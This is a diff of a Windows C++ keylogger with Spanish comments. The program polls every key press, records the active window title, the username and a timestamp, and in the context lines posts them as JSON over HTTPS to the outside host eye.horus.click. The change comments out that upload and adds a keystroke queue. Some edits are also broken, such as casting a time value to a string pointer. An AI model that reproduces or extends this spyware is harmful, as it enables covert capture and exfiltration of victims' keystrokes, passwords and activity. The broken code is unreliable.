@@ -112,10 +112,13 @@ string HttpsWebRequestPost(string domain, string url, string dat) {
 	return response;
 }
 
-//Variables globales de entorno de ejecución y sus funciones de asignación
-string window;
-string timestamp;
-string name;
+//Variables globales de entorno de ejecución y sus función Entorno() para asignarlas
+//string window;
+char* window;
+//string timestamp;
+char* timestamp;
+//string name;
+char* name;
 
 void Entorno() {
 	const int SizeOfTitleBarText = GetWindowTextLength(GetForegroundWindow());
@@ -125,7 +128,8 @@ void Entorno() {
 	free(wnd_title);
 
 	std::time_t time = std::time(nullptr);
-	timestamp = std::to_string(time);
+	//timestamp = std::to_string(time);
+	timestamp = (char*)time;
 
 	TCHAR username[UNLEN + 1];
 	DWORD username_len = UNLEN + 1;
@@ -133,18 +137,25 @@ void Entorno() {
 	name = username;
 }
 
-struct tecla {
+typedef struct tecla {
 	string tiempo;
+	//char* tiempo;
 	string ventana;
+	//char* ventana;
 	string key;
+	//char* key;
 	string nombre;
-} str_key;
+	//char* nombre;
+} type_key;
+
+type_key str_key;
 
 bool TeclasPulsadas(int tecla) {
 	Entorno();
-	str_key.ventana = window;
-	str_key.tiempo = timestamp;
-	str_key.nombre = "" + name + "_" + timestamp;
+	//En lugar de asignar las variables de entorno aquí las mando directamente al puntero send_key en la función main()
+	//str_key.ventana = window;
+	//str_key.tiempo = timestamp;
+	//str_key.nombre = "" + name + "_" + timestamp;
 
 	switch (tecla) {
 	case VK_SPACE:
@@ -387,9 +398,60 @@ bool TeclasPulsadas(int tecla) {
 	}
 }
 
+//Implementación de la cola
+typedef struct t_node {
+	type_key* key;
+	t_node* next;
+}Node;
+
+typedef struct t_queue {
+	int size;
+	Node* front;
+	Node* tail;
+}Queue;
+
+Node* getNode(type_key* key) {
+	Node* node = (Node*)malloc(sizeof(Node));
+	node->key = key;
+	node->next = NULL;
+	return node;
+}
+
+Queue* getNewQueue() {
+	Queue* q = (Queue*)malloc(sizeof(Queue));
+	q->size = 0;
+	q->front = NULL;
+	q->tail = NULL;
+	return q;
+}
+
+void Enqueue(Queue* q, Node* node) {
+	if (q->front == NULL)	q->front = node;
+	else q->tail->next = node;
+	q->tail = node;
+	q->size++;
+}
+
+type_key* Dequeue(Queue* q) {
+	if (q->size) {
+		type_key* returnValue;
+		Node* aux = q->front;
+		returnValue = aux->key;
+		q->front = q->front->next;
+		free(aux);
+		q->size--;
+		return returnValue;
+	}
+	return NULL;
+}
+
+//--Implementación de la cola--
+
 int main() {
 	//FreeConsole();
 	unsigned char key;
+	Queue* QUEUE = getNewQueue();
+	type_key* send_key = (type_key*)malloc(sizeof(type_key));
 
 	//Desplegar Encabezados
 	cout << "Tecla\t\t\t";
@@ -405,9 +467,20 @@ int main() {
 			if (GetAsyncKeyState(key) == -32767) {
 
 				if (TeclasPulsadas(key) == FALSE) {
-					str_key.key = key;
+					//str_key.ventana = window;
+					send_key->ventana = window;
+					//str_key.tiempo = timestamp;
+					send_key->tiempo = timestamp;
+					//str_key.nombre = "" + name + "_" + timestamp;
+					//send_key->nombre = "" + name + "_" + timestamp;
+					//str_key.key = key;
+					send_key->key = key;
+
+					Node* a = getNode(send_key);
+					Enqueue(QUEUE, a);
 
 					//Envío al web service
+					/*
 					string body = "{"
 						"\"Time\":\""+str_key.tiempo+"\","
 						"\"Window\":\""+str_key.ventana+"\","
@@ -416,13 +489,17 @@ int main() {
 					string ruta = "/evento/" + str_key.nombre;
 					HttpsWebRequestPost("eye.horus.click", ruta, body);
 
+					*/
 					//Impresión de depuración
 					cout << str_key.key+"\t";
 					cout << str_key.ventana+"\t";
 					cout << str_key.tiempo+"\t";
 					cout << str_key.nombre+"\n";
+					
 				}
 			}
 		}
 	}
+	free(QUEUE);
+	free(send_key);
 }
